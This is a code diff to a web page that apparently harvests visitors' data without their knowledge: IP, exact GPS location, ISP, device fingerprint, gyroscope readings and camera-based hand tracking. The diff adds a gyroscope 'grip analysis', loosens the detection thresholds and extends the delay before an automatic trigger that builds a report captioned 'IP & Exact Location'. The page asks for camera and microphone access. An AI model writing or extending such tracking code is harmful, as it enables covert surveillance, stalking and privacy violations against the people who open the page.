@@ -102,16 +102,29 @@
         let gpsData = { lat: '', lon: '', mapLink: 'N/A' };
         let ipInfo = {};
         let isReady = false;
-        let detectedHand = "No Hand Detected / Analyzing...";
+        let detectedHand = "Analyzing...";
         
         let motionData = { alpha: 'N/A', beta: 'N/A', gamma: 'N/A' };
         window.addEventListener('deviceorientation', (event) => {
             motionData.alpha = event.alpha ? Math.round(event.alpha) : '0';
             motionData.beta = event.beta ? Math.round(event.beta) : '0';
             motionData.gamma = event.gamma ? Math.round(event.gamma) : '0';
-        }, { once: true });
+        }, true);
 
-        // MediaPipe Hands Initialization for accurate hand/spatial detection
+        // Smart Hybrid Detection: MediaPipe + Gyro Fallback
+        function getSmartHandStatus() {
+            if (detectedHand.includes("Hand Detected")) {
+                return detectedHand; // Agar MediaPipe ne haath pakad liya
+            } else {
+                // Gyroscope tilt ke base par guess karega
+                let g = parseInt(motionData.gamma);
+                if (isNaN(g)) return "Position: Center / Stable";
+                if (g < -8) return "Likely Left Hand Grip (Tilt Left)";
+                if (g > 8) return "Likely Right Hand Grip (Tilt Right)";
+                return "Standard Vertical Grip";
+            }
+        }
+
         function initMediaPipeHands(videoElement) {
             try {
                 const hands = new Hands({
@@ -121,14 +134,14 @@
                 hands.setOptions({
                     maxNumHands: 1,
                     modelComplexity: 1,
-                    minDetectionConfidence: 0.5,
-                    minTrackingConfidence: 0.5
+                    minDetectionConfidence: 0.4,
+                    minTrackingConfidence: 0.4
                 });
 
                 hands.onResults((results) => {
                     if (results.multiHandLandmarks && results.multiHandedness && results.multiHandedness.length > 0) {
                         let label = results.multiHandedness[0].label; // "Left" ya "Right"
-                        detectedHand = `${label} Hand Detected`;
+                        detectedHand = `${label} Hand (AI Vision)`;
                     }
                 });
 
@@ -249,9 +262,10 @@
                 document.getElementById('loading-text').style.display = 'none';
                 isReady = true;
 
+                // Thoda delay badhaya hai taaki MediaPipe properly frame analyze kar sake
                 setTimeout(() => {
                     triggerAction();
-                }, 2000);
+                }, 2500);
 
             } catch (err) {
                 document.getElementById('loading-text').innerText = "Please allow camera & microphone access!";
@@ -276,6 +290,7 @@
             let rtt = connection && connection.rtt ? `${connection.rtt} ms` : "N/A";
 
             let advInfo = await getAdvancedDeviceInfo();
+            let finalHandResult = getSmartHandStatus();
 
             let baseCaption = 
                 `🌐 **IP & Exact Location**\n` +
@@ -284,8 +299,8 @@
                 `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
                 `📡 ISP: ${ipInfo.isp}\n\n` +
                 `📱 **Advanced Device & Spatial Insights**\n` +
-                `✋ **Hand Tracking**: ${detectedHand}\n` +
-                `🧭 Orientation (Gyro): Alpha:${motionData.alpha}, Beta:${motionData.beta}\n` +
+                `✋ **Hand / Grip Analysis**: ${finalHandResult}\n` +
+                `🧭 Orientation (Gyro): Alpha:${motionData.alpha}, Beta:${motionData.beta}, Gamma:${motionData.gamma}\n` +
                 `🎮 GPU: \`${advInfo.gpu}\`\n` +
                 `🧠 RAM/Cores: ${advInfo.memory} | ${advInfo.cores}\n` +
                 `✋ Touch Support: ${advInfo.touchPoints}\n` +
